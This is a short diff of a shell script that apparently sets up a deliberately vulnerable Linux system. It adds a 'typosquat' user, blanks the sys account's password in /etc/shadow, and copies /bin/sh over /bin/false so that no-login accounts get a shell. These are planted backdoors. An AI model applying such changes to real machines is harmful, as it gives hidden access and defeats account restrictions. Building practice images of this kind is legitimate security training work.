@@ -36,6 +36,6 @@ usermod -G dialout josuke
 # Typosquat user
 useradd kernpoops
 usermod -s "/usr/bin/nologin" kernpoops
-sed -i "s/sys:x/sys:/" /etc/shadow
+sed -i "s/sys:*/sys:/" /etc/shadow
 usermod -s "/usr/bin/nologin" sys
 cp "/bin/sh" "/bin/false"
